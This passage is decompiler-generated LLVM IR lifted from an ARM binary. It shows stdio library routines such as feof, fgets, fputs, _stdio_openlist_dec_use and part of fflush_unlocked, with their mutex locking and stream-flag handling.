  %v0_11f44.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11f44

dec_label_pc_11f44:                               ; preds = %dec_label_pc_11f14, %dec_label_pc_11f2c
  %v2_11f60 = phi i32 [ %v0_11f44.pre, %dec_label_pc_11f2c ], [ %v0_11f14, %dec_label_pc_11f14 ]
  %v1_11f44 = add i32 %v2_11f60, 16
  %v2_11f44 = inttoptr i32 %v1_11f44 to i32*
  %v3_11f44 = load i32, i32* %v2_11f44, align 4
  store i32 %v3_11f44, i32* %r3.global-to-local, align 4
  %v1_11f48 = and i32 %v3_11f44, 128
  %v2_11f48 = icmp eq i32 %v1_11f48, 0
  br i1 %v2_11f48, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_11f44
  store i32 %v2_11aec, i32* %r3.global-to-local, align 4
  %v2_11f50 = inttoptr i32 %v2_11f60 to i32*
  %v3_11f50 = load i32, i32* %v2_11f50, align 4
  %v2_11f58.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_11f58 = sub i32 %v2_11f58.pre, %v2_11aec
  store i32 %v3_11f58, i32* %r3.global-to-local, align 4
  %v5_11f5c = mul i32 %v3_11f58, 4
  %v6_11f5c = add i32 %v5_11f5c, %v3_11f50
  store i32 %v6_11f5c, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_11f44
  %v1_11f5441 = load i32, i32* %r6.global-to-local, align 4
  %v2_11f5442 = add i32 %v1_11f5441, 1
  store i32 %v2_11f5442, i32* %r3.global-to-local, align 4
  %v3_11f60 = inttoptr i32 %v2_11f60 to i32*
  store i32 %v2_11f5442, i32* %v3_11f60, align 4
  %v0_11f64.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_11f6c = phi i32 [ %v2_11f60, %.thread44 ], [ %v0_11f64.pre, %.thread46 ]
  %v1_11f64 = add i32 %v1_11f6c, 28
  %v2_11f64 = inttoptr i32 %v1_11f64 to i32*
  %v3_11f64 = load i32, i32* %v2_11f64, align 4
  store i32 %v3_11f64, i32* %r3.global-to-local, align 4
  %v1_11f68 = add i32 %v3_11f64, 2
  store i32 %v1_11f68, i32* %r0.global-to-local, align 4
  %v0_11f6c = load i32, i32* %sb.global-to-local, align 4
  %v2_11f6c = add i32 %v1_11f6c, 24
  %v3_11f6c = inttoptr i32 %v2_11f6c to i32*
  store i32 %v0_11f6c, i32* %v3_11f6c, align 4
  br i1 %v2_11f48, label %dec_label_pc_11f7c, label %bb147

bb147:                                            ; preds = %bb146
  %v1_11f70 = load i32, i32* @r2, align 4
  %v2_11f70 = load i32, i32* %r7.global-to-local, align 4
  %v3_11f70 = inttoptr i32 %v2_11f70 to i32*
  store i32 %v1_11f70, i32* %v3_11f70, align 4
  br label %dec_label_pc_11f7c

dec_label_pc_11f78:                               ; preds = %dec_label_pc_11b34, %dec_label_pc_11c40, %dec_label_pc_11cf0, %dec_label_pc_11cc4, %dec_label_pc_11cd0, %dec_label_pc_11c10, %dec_label_pc_11eb0, %dec_label_pc_11e5c, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f7c

dec_label_pc_11f7c:                               ; preds = %bb147, %bb146, %dec_label_pc_11f78
  %v2_11f80 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11f80, i32* @r4, align 4
  store i32 %v6_11ae4, i32* @r5, align 4
  %v26_11f80 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_11f80

; uselistorder directives
  uselistorder i32 %v3_11f58, { 1, 0 }
  uselistorder i32 %v1_11f18, { 1, 2, 0 }
  uselistorder i32 %v0_11ecc, { 1, 2, 0 }
  uselistorder i32 %v2_11ea8, { 1, 0 }
  uselistorder i32 %v1_11ea8, { 1, 0, 2 }
  uselistorder i32 %v0_11ec8, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_11e0c, { 1, 2, 0 }
  uselistorder i32 %v3_11df4, { 1, 0 }
  uselistorder i32 %v3_11dec, { 1, 0 }
  uselistorder i32 %v2_11dcc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11db4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11d98, { 1, 0, 2 }
  uselistorder i32 %v3_11d78, { 2, 1, 0 }
  uselistorder i32 %v1_11d3c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11d10, { 1, 0 }
  uselistorder i32 %v5_11c70, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11c70, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_11c1c, { 1, 0 }
  uselistorder i32 %v0_11c38, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_11c00, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11be8, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_11bd4, { 1, 2, 0 }
  uselistorder i32 %v0_11c4c, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_11b88, { 1, 0 }
  uselistorder i32 %v1_11b58, { 0, 2, 1 }
  uselistorder i32 %v25_11ae4, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 4, 1, 0, 5, 9, 6, 2, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18 }
  uselistorder i32* %r6.global-to-local, { 12, 8, 13, 10, 0, 2, 14, 3, 4, 5, 7, 11, 15, 6, 1, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 50, 10, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 16, 15, 0, 1, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 40, 41, 42, 38, 39, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 3840, { 4, 5, 6, 2, 3, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1d678.626 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1d688.624 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1d6a4.618 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1d664.616 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0 }
  uselistorder label %dec_label_pc_11f7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f78, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_11f44, { 1, 0 }
  uselistorder label %dec_label_pc_11f14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f00, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11ebc, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_11e74, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d28, { 1, 0 }
  uselistorder label %dec_label_pc_11d00, { 1, 0 }
  uselistorder label %dec_label_pc_11cb0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11c30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c2c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b8c, { 1, 0 }
  uselistorder label %dec_label_pc_11b7c, { 1, 0 }
}

define i32 @feof(i8* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11fa8 = load i32, i32* @r4, align 4
  store i32 %v3_11fa8, i32* %stack_var_-16, align 4
  %v6_11fa8 = load i32, i32* @r5, align 4
  %v9_11fa8 = load i32, i32* @r6, align 4
  %v2_11fac = add i32 %tmp, 52
  %v3_11fac = inttoptr i32 %v2_11fac to i32*
  %v4_11fac = load i32, i32* %v3_11fac, align 4
  store i32 %v4_11fac, i32* @r6, align 4
  %v2_11fb0 = add i32 %tmp, 56
  store i32 %v2_11fb0, i32* @r5, align 4
  %v2_11fb4 = ptrtoint i32* %stack_var_-32 to i32
  %v2_11fb8 = icmp eq i32 %v4_11fac, 0
  store i32 %tmp, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_11fb0, i32* @r2, align 4
  store i32 %v2_11fb4, i32* @r0, align 4
  br i1 %v2_11fb8, label %dec_label_pc_11fd0, label %dec_label_pc_11fec

dec_label_pc_11fd0:                               ; preds = %entry
  %v1_11fd8 = call i32 @__pthread_cleanup_push_defer()
  %v0_11fdc = load i32, i32* @r5, align 4
  %v2_11fe8 = call i32 @pthread_mutex_lock(i32 %v0_11fdc)
  %v0_11fec.pre = load i32, i32* @r4, align 4
  %v0_11ff4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11fec

dec_label_pc_11fec:                               ; preds = %entry, %dec_label_pc_11fd0
  %v0_11ff4 = phi i32 [ %v4_11fac, %entry ], [ %v0_11ff4.pre, %dec_label_pc_11fd0 ]
  %v0_11fec = phi i32 [ %tmp, %entry ], [ %v0_11fec.pre, %dec_label_pc_11fd0 ]
  %v1_11fec = add i32 %v0_11fec, 1
  %v2_11fec = inttoptr i32 %v1_11fec to i8*
  %v3_11fec = load i8, i8* %v2_11fec, align 1
  %v4_11fec = zext i8 %v3_11fec to i32
  %v1_11ff0 = inttoptr i32 %v0_11fec to i8*
  %v2_11ff0 = load i8, i8* %v1_11ff0, align 1
  %v3_11ff0 = zext i8 %v2_11ff0 to i32
  %v2_11ff4 = icmp eq i32 %v0_11ff4, 0
  %v4_12000 = mul nuw nsw i32 %v4_11fec, 256
  %v5_12000 = or i32 %v3_11ff0, %v4_12000
  store i32 %v5_12000, i32* %r4.global-to-local, align 4
  br i1 %v2_11ff4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11fec
  call void @__pseudo_branch(i32 58236)
  %v0_12010.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11fec, %bb
  %v0_12010 = phi i32 [ %v5_12000, %dec_label_pc_11fec ], [ %v0_12010.pre, %bb ]
  %v1_12010 = and i32 %v0_12010, 4
  %v2_12018 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12018, i32* @r4, align 4
  store i32 %v6_11fa8, i32* @r5, align 4
  store i32 %v9_11fa8, i32* @r6, align 4
  ret i32 %v1_12010

; uselistorder directives
  uselistorder i32 %v0_11fec, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11fec, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1202c = load i32, i32* @r4, align 4
  store i32 %v3_1202c, i32* %stack_var_-24, align 4
  %v6_1202c = load i32, i32* @r5, align 4
  %v9_1202c = load i32, i32* @r6, align 4
  %v12_1202c = load i32, i32* @r7, align 4
  %v1_12030 = add i32 %arg3, 52
  %v2_12030 = inttoptr i32 %v1_12030 to i32*
  %v3_12030 = load i32, i32* %v2_12030, align 4
  store i32 %v3_12030, i32* %r8.global-to-local, align 4
  %v2_12034 = ptrtoint i32* %stack_var_-40 to i32
  %v1_12038 = add i32 %arg3, 56
  store i32 %v1_12038, i32* @r5, align 4
  %v2_1203c = icmp eq i32 %v3_12030, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v1_12038, i32* @r2, align 4
  store i32 %v2_12034, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  br i1 %v2_1203c, label %dec_label_pc_1205c, label %dec_label_pc_12078

dec_label_pc_1205c:                               ; preds = %entry
  %v1_12064 = call i32 @__pthread_cleanup_push_defer()
  %v0_12068 = load i32, i32* @r5, align 4
  store i32 73848, i32* @lr, align 4
  %v2_12074 = call i32 @pthread_mutex_lock(i32 %v0_12068)
  %v0_12078.pre = load i32, i32* @r6, align 4
  %v0_1207c.pre = load i32, i32* @r4, align 4
  %v0_12080.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12078

dec_label_pc_12078:                               ; preds = %entry, %dec_label_pc_1205c
  %v0_12080 = phi i32 [ %arg1, %entry ], [ %v0_12080.pre, %dec_label_pc_1205c ]
  %v0_1207c = phi i32 [ %arg3, %entry ], [ %v0_1207c.pre, %dec_label_pc_1205c ]
  %v0_12078 = phi i32 [ %arg2, %entry ], [ %v0_12078.pre, %dec_label_pc_1205c ]
  %v3_12084 = inttoptr i32 %v0_12080 to i8*
  %v4_12084 = call i32 @__GI_fgets_unlocked(i8* %v3_12084, i32 %v0_12078, i32 %v0_1207c)
  %v0_12088 = load i32, i32* %r8.global-to-local, align 4
  %v2_12088 = icmp eq i32 %v0_12088, 0
  store i32 %v4_12084, i32* %r4.global-to-local, align 4
  br i1 %v2_12088, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12078
  store i32 73892, i32* @lr, align 4
  call void @__pseudo_branch(i32 58236)
  %v0_120a4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12078, %bb
  %v0_120a4 = phi i32 [ %v4_12084, %dec_label_pc_12078 ], [ %v0_120a4.pre, %bb ]
  %v2_120ac = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_120ac, i32* @r4, align 4
  store i32 %v6_1202c, i32* @r5, align 4
  store i32 %v9_1202c, i32* @r6, align 4
  store i32 %v12_1202c, i32* @r7, align 4
  ret i32 %v0_120a4

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12078, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_120c0 = load i32, i32* @r4, align 4
  store i32 %v3_120c0, i32* %stack_var_-20, align 4
  %v6_120c0 = load i32, i32* @r5, align 4
  %v9_120c0 = load i32, i32* @r6, align 4
  %v12_120c0 = load i32, i32* @r7, align 4
  %v1_120c4 = add i32 %arg2, 52
  %v2_120c4 = inttoptr i32 %v1_120c4 to i32*
  %v3_120c4 = load i32, i32* %v2_120c4, align 4
  store i32 %v3_120c4, i32* @r7, align 4
  %v1_120c8 = add i32 %arg2, 56
  store i32 %v1_120c8, i32* @r5, align 4
  %v2_120cc = ptrtoint i32* %stack_var_-36 to i32
  %v2_120d0 = icmp eq i32 %v3_120c4, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v1_120c8, i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_120cc, i32* @r0, align 4
  br i1 %v2_120d0, label %dec_label_pc_120ec, label %dec_label_pc_12108

dec_label_pc_120ec:                               ; preds = %entry
  %v1_120f4 = call i32 @__pthread_cleanup_push_defer()
  %v0_120f8 = load i32, i32* @r5, align 4
  store i32 73992, i32* @lr, align 4
  %v2_12104 = call i32 @pthread_mutex_lock(i32 %v0_120f8)
  %v0_12108.pre = load i32, i32* @r4, align 4
  %v0_1210c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12108

dec_label_pc_12108:                               ; preds = %entry, %dec_label_pc_120ec
  %v0_1210c = phi i32 [ %arg1, %entry ], [ %v0_1210c.pre, %dec_label_pc_120ec ]
  %v0_12108 = phi i32 [ %arg2, %entry ], [ %v0_12108.pre, %dec_label_pc_120ec ]
  %v2_12110 = inttoptr i32 %v0_1210c to i8*
  %v3_12110 = call i32 @__GI_fputs_unlocked(i8* %v2_12110, i32 %v0_12108)
  %v0_12114 = load i32, i32* @r7, align 4
  %v2_12114 = icmp eq i32 %v0_12114, 0
  store i1 %v2_12114, i1* @cpsr_z, align 1
  store i32 %v3_12110, i32* %r4.global-to-local, align 4
  br i1 %v2_12114, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12108
  store i32 74032, i32* @lr, align 4
  call void @__pseudo_branch(i32 58236)
  %v0_12130.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12108, %bb
  %v0_12130 = phi i32 [ %v3_12110, %dec_label_pc_12108 ], [ %v0_12130.pre, %bb ]
  %v2_12138 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12138, i32* @r4, align 4
  store i32 %v6_120c0, i32* @r5, align 4
  store i32 %v9_120c0, i32* @r6, align 4
  store i32 %v12_120c0, i32* @r7, align 4
  ret i32 %v0_12130

; uselistorder directives
  uselistorder i32 (i8*, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12108, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v6_1214c = load i32, i32* @r5, align 4
  %v2_12150 = ptrtoint i32* %stack_var_-48 to i32
  %v2_12154 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_12154, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2b598.559 to i32), i32* @r2, align 4
  store i32 58060, i32* @r4, align 4
  %v1_12168 = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* @r5, align 4
  %v2_12178 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b598.559 to i32))
  %v2_12180 = load i32, i32* @global_var_2deb0.561, align 4
  %v7_12184 = icmp eq i32 %v2_12180, 1
  br i1 %v7_12184, label %dec_label_pc_1218c, label %dec_label_pc_12238

dec_label_pc_1218c:                               ; preds = %entry
  %v2_12190 = load i32, i32* @global_var_2deb4.566, align 4
  %tmp19 = icmp slt i32 %v2_12190, 1
  br i1 %tmp19, label %dec_label_pc_12238, label %dec_label_pc_1219c

dec_label_pc_1219c:                               ; preds = %dec_label_pc_1218c
  store i32 %v2_12150, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2b580.577 to i32), i32* @r2, align 4
  %v1_121ac = call i32 @__pthread_cleanup_push_defer()
  %v2_121b8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b580.577 to i32))
  %v2_121c0 = load i32, i32* bitcast (i32** @global_var_2b57c.384 to i32*), align 4
  store i32 %v2_121c0, i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  %v2_122103 = icmp eq i32 %v2_121c0, 0
  br i1 %v2_122103, label %dec_label_pc_1221c, label %dec_label_pc_121cc

dec_label_pc_121cc:                               ; preds = %dec_label_pc_1219c, %dec_label_pc_1220c
  %v1_121e4 = phi i32 [ %v0_1220c, %dec_label_pc_1220c ], [ %v2_121c0, %dec_label_pc_1219c ]
  %v1_121cc = inttoptr i32 %v1_121e4 to i8*
  %v2_121cc = load i8, i8* %v1_121cc, align 1
  %v3_121cc = zext i8 %v2_121cc to i32
  %v1_121d0 = add i32 %v1_121e4, 1
  %v2_121d0 = inttoptr i32 %v1_121d0 to i8*
  %v3_121d0 = load i8, i8* %v2_121d0, align 1
  %v4_121d0 = zext i8 %v3_121d0 to i32
  %v4_121d4 = mul nuw nsw i32 %v4_121d0, 256
  %v5_121d4 = or i32 %v4_121d4, %v3_121cc
  %v2_121d8 = and i32 %v5_121d4, 32816
  %v7_121dc = icmp eq i32 %v2_121d8, 48
  %v1_121e0 = add i32 %v1_121e4, 32
  %v2_121e0 = inttoptr i32 %v1_121e0 to i32*
  %v3_121e0 = load i32, i32* %v2_121e0, align 4
  store i32 %v3_121e0, i32* @r5, align 4
  br i1 %v7_121dc, label %dec_label_pc_121ec, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_121cc
  store i32 %v1_121e4, i32* @r6, align 4
  br label %dec_label_pc_1220c

dec_label_pc_121ec:                               ; preds = %dec_label_pc_121cc
  %v0_121ec = load i32, i32* @r6, align 4
  %v2_121ec = icmp eq i32 %v0_121ec, 0
  br i1 %v2_121ec, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_121ec
  %v3_121f4 = add i32 %v0_121ec, 32
  %v4_121f4 = inttoptr i32 %v3_121f4 to i32*
  store i32 %v3_121e0, i32* %v4_121f4, align 4
  %v0_121fc.pre = load i32, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_121ec
  store i32 %v3_121e0, i32* bitcast (i32** @global_var_2b57c.384 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_121fc = phi i32 [ %v0_121fc.pre, %.thread ], [ %v1_121e4, %.thread1 ]
  %v1_121fc = add i32 %v0_121fc, 1
  %v2_121fc = inttoptr i32 %v1_121fc to i8*
  %v3_121fc = load i8, i8* %v2_121fc, align 1
  %v1_12200 = and i8 %v3_121fc, 32
  %v1_12208 = icmp ne i8 %v1_12200, 0
  call void @__pseudo_cond_branch(i1 %v1_12208, i32 ptrtoint (i32* @global_var_134b0.563 to i32))
  %v0_1220c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %.thread12, %bb
  %v0_1220c = phi i32 [ %v0_1220c.pre, %bb ], [ %v3_121e0, %.thread12 ]
  store i32 %v0_1220c, i32* @r4, align 4
  %v2_12210 = icmp eq i32 %v0_1220c, 0
  br i1 %v2_12210, label %dec_label_pc_1221c, label %dec_label_pc_121cc

dec_label_pc_1221c:                               ; preds = %dec_label_pc_1220c, %dec_label_pc_1219c
  store i32 %v2_12150, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 74288, i32* @lr, align 4
  %v1_1222c = call i32 @__pthread_cleanup_pop_restore()
  %v0_12234 = load i32, i32* @r4, align 4
  store i32 %v0_12234, i32* @global_var_2deb4.566, align 4
  %v2_1223c.pre = load i32, i32* @global_var_2deb0.561, align 4
  br label %dec_label_pc_12238

dec_label_pc_12238:                               ; preds = %entry, %dec_label_pc_1218c, %dec_label_pc_1221c
  %v2_1223c = phi i32 [ %v2_12180, %entry ], [ 1, %dec_label_pc_1218c ], [ %v2_1223c.pre, %dec_label_pc_1221c ]
  %v1_12240 = add i32 %v2_1223c, -1
  store i32 %v1_12240, i32* @global_var_2deb0.561, align 4
  store i32 %v2_12154, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 74332, i32* @lr, align 4
  %v1_12258 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v6_1214c, i32* @r5, align 4
  ret i32 %v1_12258

; uselistorder directives
  uselistorder i32 %v0_1220c, { 2, 1, 0 }
  uselistorder i32 %v3_121e0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_121e4, { 0, 1, 2, 4, 3 }
  uselistorder i32* @global_var_2deb4.566, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_12238, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1220c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_121cc, { 1, 0 }
}

define i32 @fflush_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1228c = load i32, i32* @r4, align 4
  %v6_1228c = load i32, i32* @r5, align 4
  %v15_1228c = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32** @global_var_2b57c.384 to i32), i32* %r3.global-to-local, align 4
  %v10_12294 = icmp eq i8* %arg1, bitcast (i32** @global_var_2b57c.384 to i8*)
  store i1 %v10_12294, i1* %cpsr_z.global-to-local, align 1
  %.v1_12298 = select i1 %v10_12294, i32 0, i32 %tmp
  store i32 %.v1_12298, i32* @r8, align 4
  %v2_122a0 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_12294, label %bb, label %dec_label_pc_122ac

bb:                                               ; preds = %entry
  store i32 %.v1_12298, i32* @sl, align 4
  br label %dec_label_pc_122b8

dec_label_pc_122ac:                               ; preds = %entry
  %v2_122ac = icmp eq i32 %.v1_12298, 0
  store i1 %v2_122ac, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* @sl, align 4
  br i1 %v2_122ac, label %dec_label_pc_122b8, label %dec_label_pc_12404

dec_label_pc_122b8:                               ; preds = %bb, %dec_label_pc_122ac
  store i32 ptrtoint (i32* @global_var_2b598.559 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_122a0, i32* @r0, align 4
  %v1_122cc = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_2b598.559 to i32), i32* %r0.global-to-local, align 4
  %v2_122dc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b598.559 to i32))
  %v2_122e4 = load i32, i32* @global_var_2deb0.561, align 4
  %v1_122e8 = add i32 %v2_122e4, 1
  store i32 %v1_122e8, i32* %r3.global-to-local, align 4
  store i32 %v1_122e8, i32* @global_var_2deb0.561, align 4
  store i32 58236, i32* @r5, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_122a0, i32* @r0, align 4
  store i32 74500, i32* @lr, align 4
  %v1_12300 = call i32 @__pthread_cleanup_pop_restore()
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2b580.577 to i32), i32* @r2, align 4
  store i32 %v2_122a0, i32* @r0, align 4
  %v1_12314 = call i32 @__pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2b580.577 to i32), i32* %r0.global-to-local, align 4
  %v2_12320 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b580.577 to i32))
  store i32 ptrtoint (i32** @global_var_2b57c.384 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_122a0, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v2_12330 = load i32, i32* bitcast (i32** @global_var_2b57c.384 to i32*), align 4
  store i32 %v2_12330, i32* @r6, align 4
  store i32 74556, i32* @lr, align 4
  %v1_12338 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v1_12338, i32* %r0.global-to-local, align 4
  store i32 %v2_122a0, i32* @r4, align 4
  %v0_12340 = load i32, i32* @r8, align 4
  store i32 %v0_12340, i32* @r5, align 4
  %v0_123f4.pr = load i32, i32* @r6, align 4
  %v2_123f425 = icmp eq i32 %v0_123f4.pr, 0
  store i1 %v2_123f425, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123f425, label %dec_label_pc_123fc, label %dec_label_pc_12348

dec_label_pc_12348:                               ; preds = %dec_label_pc_122b8, %.thread11
  %v0_12364 = phi i32 [ %v3_123f0, %.thread11 ], [ %v0_123f4.pr, %dec_label_pc_122b8 ]
  %v1_12348 = inttoptr i32 %v0_12364 to i8*
  %v2_12348 = load i8, i8* %v1_12348, align 1
  %v3_12348 = zext i8 %v2_12348 to i32
  store i32 %v3_12348, i32* %r3.global-to-local, align 4
  %v1_1234c = and i32 %v3_12348, 64
  %v2_1234c = icmp eq i32 %v1_1234c, 0
